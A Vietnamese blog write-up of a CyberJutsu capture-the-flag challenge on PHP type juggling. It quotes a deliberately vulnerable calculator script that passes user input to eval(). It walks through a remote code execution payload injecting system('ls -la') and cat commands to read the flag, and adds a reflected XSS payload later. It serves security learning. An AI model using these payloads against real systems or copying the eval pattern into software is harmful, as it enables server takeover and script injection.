---
title: CBJS Challenge - PHP TYPE JUGGLING (Write up)
date: 2022-03-27 02:21:02
tags: [PHP Security, Security, CTF, PHP Type Juggling]
categories:
  - PHP 
---

Thật ra bài này đã có người khác viết write up rất hoàn chỉnh rồi. Mình viết dưới phương diện của người mới tiếp cận bảo mật, nhất là khi tiếp cận 1 bài CTF được đố bằng 1 ngôn ngữ mà mình chẳng hề quen thuộc. Bởi vì do quá thiếu kinh nghiệm nên khi giải bài mà mình gặp rất nhiều trắc trở, mình viết bởi vì mình muốn rút kinh nghiệm cho bản thân. Hi vọng ai đọc được sẽ góp ý giúp mình.

## Yêu cầu của đề bài

_Remote Code Execution được server và kiếm được FLAG_

## Dữ kiện

URL của challenge: http://css.kid.cyberjutsu-lab.tech:9000/type\_juggling\_inarray.php?p1=191&p2=7&op=%2a

Sau khi truy cập link ta thấy:

{% asset_img 1.png %}

_Ảnh 0_

Ấn vào button source, ta được chuyển tới page sau, URL của page là: http://css.kid.cyberjutsu-lab.tech:9000/type\_juggling\_inarray.php?debug

{% asset_img 2.png %}

_Ảnh 1_

Trang cung cấp cho ta source code của challenge này:

```php
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>MyApp Home</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="column">
        <h1>>SmartCalc.exe_</h1>

        <?php

        ini_set('display_errors','On');
        ini_set('error_reporting','E_ALL');
        error_reporting(E_ALL);
        if(isset($_GET['debug'])) die(highlight_file(__FILE__));

        $whitelist_numbers =  range(1,1000);
        $whitelist_ops = array("+","-","*","/");

        $param1 = $_GET['p1'];
        $param2 = $_GET['p2'];
        $operator = $_GET['op'];


        if( in_array($param1, $whitelist_numbers) && in_array($param2, $whitelist_numbers) && in_array($operator, $whitelist_ops) ){
            $exec = "${param1} ${operator} ${param2}";
            $evalcode = "return $exec;";

            echo "<details><summary>DEBUG</summary>";
            echo "PHP sẽ thực thi eval code sau đây:";
            echo "<pre>$evalcode</pre>";
            echo "</details><br>";

            // Nếu chưa biết về eval có thể đọc ở đây: https://php.net/eval
            echo $exec . " = ". eval($evalcode);
        } else {
            echo "Not supported";
        }

        ?>
    </pre>
    <p>👉 <a href="?p1=191&p2=7&op=*">example</a><br>🤖 <a href="?debug">source</a></p>
</div>
</body>
```

## Khử 1 vài nhiễu trong đề bài

Như mình nói ở trên, PHP là ngôn ngữ mà mình không hề quen thuộc. Khi đọc đề nếu như bạn cũng như mình, chưa quen với PHP thì khi đọc code có thể sẽ bị đi lan man vào nhiều phần không cần thiết. Ở đoạn code trên có 1 dòng mà nhiều người nghĩ là quan trọng:

```plaintext
if(isset($_GET['debug'])) die(highlight_file(__FILE__));
```

Dòng này có 1 khối if mà trong đó có hàm **isset()** và tham số truyền vào là biến debug, biến debug được truyền vào từ URL, cụ thể nó ở sau dấu ? trên URL. Mình sẽ dùng hình sau để cho dễ mình họa:

{% asset_img 3.png %}

_Ảnh 2_

Như bạn thấy ở ảnh 2, biến debug được truyền vào sau dấu **?**. Vậy thì nếu biến debug được truyền vào thì sẽ chạy code bên trong khối if, khối code đó là \*\*die(highlight_file(\_\_FILE\_\_)); \*\*. Hàm **highlight_file()** có nhiệm vụ hiển thị source code của file, tham số **\_\_FILE\_\_** chính là đường dẫn đến thư mục hiện tại. Hàm **die()** có nhiệm vụ dừng việc thực thi script, có nghĩa là các đoạn code phía sau hàm này sẽ không được thực thi. Tổng kết lại thì nếu truyền biến debug vào thì chương trình in ra source code của file hiện tại (đây lý do bạn nhìn thấy code của thử thách này).

**1 vài link liên quan về phần này:**

- Mình tình cờ biết được tác dụng của hàm này từ trước đó nên không mất công google, mình xem ở video nói về XSS của CyberJutsu, ở phút 5:55 https://www.youtube.com/watch?v=X6QaMATKGMg&t=327s
- Về hàm **die()**: https://www.php.net/manual/en/function.die.php
- Về hàm **highlight_file()**: https://www.php.net/manual/en/function.highlight-file.php
- Về biến **\_\_FILE\_\_**: https://php.vn.ua/manual/ro/language.constants.predefined.php

## Phân tích

Do yêu cầu của đề bài là **RCE** (Remote Code Excution) nên mình search google và biết được hàm **eval()** trong PHP có thể là vector để RCE. Bởi vì hàm **eval()** cho phép tham số truyền vào được thực thi dưới dạng code PHP bình thường, nếu để người dùng tùy ý thay đổi tham số này thì rất có thể hàm như **system()** sẽ được gọi để thực thi code, dẫn tới việc **RCE**.

- Về thuật ngữ **RCE**: https://www.bugcrowd.com/glossary/remote-code-execution-rce/
- Về hàm **eval()**: https://www.php.net/manual/en/function.eval.php

Hàm **eval()** xuất hiện trong khối code sau:

```php
if (in_array($param1, $whitelist_numbers) && in_array($param2, $whitelist_numbers) && in_array($operator, $whitelist_ops)) {
    $exec = "${param1} ${operator} ${param2}";
    $evalcode = "return $exec;";

    echo "<details>
    <summary>DEBUG</summary>";
    echo "PHP sẽ thực thi eval code sau đây:";
    echo "
    <pre>$evalcode</pre>";
    echo "
</details><br>";

    // Nếu chưa biết về eval có thể đọc ở đây: https://php.net/eval
    echo $exec . " = " . eval($evalcode);
} else {
    echo "Not supported";
}
```

Để đến được hàm eval() thì như ta thấy có 1 khối điều kiện **if**, do có các toán tử && xuất hiện 2 lần nên ta đoán được 3 toán hạng kia phải trả về **true**. Vậy làm sao để 3 toán hạng đều trả về **true**. Mình bắt đầu google về hàm **in_array**, chi tiết mình xem ở đây: https://www.php.net/manual/en/function.in-array.php

{% asset_img 4.png %}

_Ảnh 3_

Ta thấy hàm này nhận 3 tham số, tham số đầu là 1 string, tham số thứ 2 là 1 array, tham số thứ 3 là true hoặc false. **Searches for needle in haystack using loose comparison unless strict is set** - câu này nói đại ý rằng nếu không truyền tham số thứ 3 vào thì hàm **in_array** sẽ tiến hành thực hiện việc tìm chuỗi được truyền vào từ tham số đầu mà có xuất hiện trong mảng được truyền vào bằng tham số thứ 2 với kiểu so sánh là **loose comparison**, nó chính là toán tử so sánh **\==**. Có thể viết 1 chút về thuật toán đằng sau hàm này:

```php
$kết_quả_trả_về = false;
for($x = 0; $x <= chiều dài mảng từ tham số thứ 2; $x+=1) {
 if ( mảng từ tham số thứ 2[x] == chuỗi từ tham số thứ nhất) {
  $kết_quả_trả_về = true;
 } else {
  $kết_quả_trả_về = false;
 }
}
```

Bài này được xây dựng dựa trên 1 hành vi của ngôn ngữ PHP, đó là PHP TYPE JUGGLING. CyberJutsu có 2 slide nói về điều này.

{% asset_img 5.png %}

_Ảnh 4_

{% asset_img 6.png %}

_Ảnh 5_

Đọc xong 2 cái slide này thì mình phải thốt lên: **_Ảo thật đấy!_**

Mình đã thử **var_dump((int)"1lasfas")** và nó vẫn trả về **int(1)**. Mình nhận ra chỉ cần ném con số 1 ra đằng trước thì đằng sau mình ghi chuỗi gì thì nó vẫn trả về **(int)1**. Vậy thì bypass 2 toán hạng **in_array($param1, $whitelist_numbers)** và **in_array($param2, $whitelist_numbers)** để nó trả về **true** cũng dễ thôi.

```php
$param1 = $_GET[‘p1’]; //tham số param1 chính là phần ?p1= ở trên URL, tương tự với param2 là phần &p2=
//cái này kiến thức về HTTP Protocol
$whitelist_numbers = range(1, 1000); //whitelist trải dài từ 1->1000
```

Mình truyền tham số như sau: **in_array("1fasfsaf",$whitelist_numbers)** thì kiểu gì hàm **in_array** cũng trả về **true**.

> Cơ mà 1 điều lưu ý ở đây là nó chỉ trả về **true** nếu phiên bản PHP là 7.4.0 - 7.4.28, từ các phiên bản PHP 8.0.1 - 8.0.17, 8.1.0 - 8.1.4 nó sẽ trả về **false**.

Bypass toán hạng **in_array($operator, $whitelist_ops)** còn dễ hơn nữa khi mà ta biết **$whitelist_ops = array("+","-","\*","/")**, đơn giản chỉ cần truyền tham số **$operator** là 1 trong 4 dấu có trong **$whitelist_ops** là được, ví dụ **in_array("+", $whitelist_ops)**.

Tất nhiên chúng ta còn 1 điều quan trọng nữa thực hiện được RCE, đó chính là ta cần cho hàm **eval()** chạy những command mà ta muốn. Ta thấy hàm **eval()** được truyền vào tham số **$evalcode**. Trước đó **$evalcode** được cấu thành từ 2 dòng sau:

```php
$exec = "${param1} ${operator} ${param2}";
$evalcode = "return $exec;";
```

Mình tưởng tượng biến **$evalcode** sẽ có dạng **"return 1 \* 1 . system('lệnh cần gọi');"**. Mình search: https://www.php.net/manual/en/function.system.php thì biết hàm **system()** sẽ trả về **1 chuỗi** nếu như lệnh bên trong là đúng, ngược lại nếu lệnh bên trong sai thì nó sẽ trả về **false**. Lúc này nếu biến **$evalcode** được thực thi như 1 đoạn code PHP thì nó sẽ trả về **"1 chuỗi_trả_về_khi_thực_thi_hàm_system"**, vậy thì coi như những kết quả trả về từ hàm **system()** sẽ được in hết lên trang web dưới dạng string.

Giá trị các biến mà mình truyền vào sẽ như sau:

```php
$param1 = "1";
$param2 = "1 . system('lệnh cần gọi')";
$operator = "*";
```

Để truyền các payload qua HTTP GET Protocol thì mình cần truyền vào sau dấu **?** trên thanh URL như sau: **p1=1&p2=1 . system('ls -la')&op=**\* Do truyền qua GET Protocol thì các biến như p1, p2,op phải được encode trước khi gửi. Mình encode thông qua tài liệu: https://www.w3schools.com/tags/ref\_urlencode.asp

Vậy cuối cùng payload sẽ là **p1=1&p2=1%20.%20system(%27ls+-la%27)&op=**\*. Sau khi gửi thì server trả về đoạn code HTML trông như sau (mình dùng Burp Suite để tiện cho việc hiển thị code HTML, bạn nào thích thì có thể tìm hiểu thêm tại: https://portswigger.net/burp)

{% asset_img 7.png %}

_Ảnh 6_

Ắt hẳn server chứa cái trang web này dùng hệ điều hành Linux, câu lệnh vừa rồi mình dùng là: **ls -la** để hiện thị ra các directory và file ngang hàng với file **type_juggling_inarray.php** bao gồm cả các directory và file ẩn, bạn nào dùng Linux cũng biết nếu dùng câu lệnh này mà output có **\-rwxrwxrwx** thì ký tự **\-** ở đầu là đại diện cho định dạng file, còn nếu ở trước có **drwxrwxrwx** thì **d** đại diện cho định dạng directory.

Mình thấy có 3 file là _md5_password_compare.php_, _style.css_, _type_juggling_inarray.php_. Bỏ qua file _type_juggling_inarray.php_ vì nó là file mà bạn đã được xem source ngay trên web. Mình sẽ dùng lệnh **cat md5_password_compare.php** và tương tự **cat style.css** để xem trong nội dung của 2 file kia có chứa flag không. Đổi lệnh thì chỉ cần đổi phần bên trong hàm **system()** rồi encode lại theo tài liệu bên trên là được. Kết quả không như mong đợi, file _md5_password_compare.php_ thì trả về:

{% asset_img 8.png %}

_Ảnh 7_

Còn file _style.css_ trả về:

{% asset_img 9.png %}

_Ảnh 8_

Nói chung là 2 file này không có chứa flag, tuy nhiên nhớ lại _Ảnh 6_ thì mình biết không còn cái directory nào nằm ngang hàng file _type_juggling_inarray.php_. Mình thử xem các directory và file nằm ở thư mục root của hệ điều hành Linux bằng câu lệnh **ls / -la**, kết quả trả về:

{% asset_img 10.png %}

_Ảnh 9_

Trông có vẻ khả quan khi mình thấy có 1 file tên _DAY_LA_CAI_FLAG_CHUC_MUNG_BAN_. Xem nội dung file này bằng lệnh **cat /DAY_LA_CAI_FLAG_CHUC_MUNG_BAN**, kết quả trả về:

{% asset_img 11.png %}

_Ảnh 10_

Ta tìm ra flag:

> CBJS{type_juggling_PHP_is_weird}

## Lỗi còn sót - Reflected XSS (Update ngày 1/4/2022)

Mới đây thì mình biết là vẫn còn 1 lỗi bị bỏ sót, đó là XSS. Nhìn lại 1 chút đoạn code sau:

```php
$exec = "${param1} ${operator} ${param2}"; //1
$evalcode = "return $exec;"; //2

echo "<details><summary>DEBUG</summary>"; //3
echo "PHP sẽ thực thi eval code sau đây:"; //4
 echo "<pre>$evalcode</pre>"; //5
```

Ở là dòng 5 có thể là 1 nơi có thể dẫn đến Reflected XSS. Vì _$evalcode_ ở dòng này sẽ in ra dưới dạng string, mà string trả về cho phía Client nếu như không được filter thì rất dễ xảy ra việc XSS, ở đây là Reflected XSS. Chúng ta sẽ cố gắng chèn được thẻ script để thực thi JS tại trình duyệt, mình sẽ dùng hàm alert để hiện thị ra 1 popup hiển thị domain của trình duyệt, chứng minh mình XSS được trên đó. Payload truyền vào param1, param2, operator vẫn phải thỏa mãn các điều kiện mà mình đã phân tích ở trên. Hãy tưởng tượng ở dòng 1 mình truyền vào payload như sau:

```plaintext
$exec = "1<script>alert(document.domain)</script> / 1";
//param1 = "1<script>alert(document.domain)</script>"
//param2 = "1"
//operator = "/"
```

Từ payload trên bạn có thể tưởng tượng đoạn script của JS có thể được thực thi ngay tại trình duyệt. Đây là kết quả của nó, mình cho phép hiển thị ra pop-up in ra domain của trang web này:

{% asset_img 12.png %}

_Ảnh 11_

Mình có bôi xanh phần payload mà mình truyền vào tại _Ảnh 11_. Nếu bạn truy cập vào đường link sau thì thấy sẽ có pop-up hiện ra, hoặc bạn có thể tự thử payload như trên để trigger được reflected XSS: `http://css.kid.cyberjutsu-lab.tech:9000/type_juggling_inarray.php?p1=1%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&p2=2&op=%2F&fbclid=IwAR0VeJTSwrNFRPZuDAC8XVa2_jufMwKeAznJT2y8ncV2kU1g7NQuRBuSIWc`
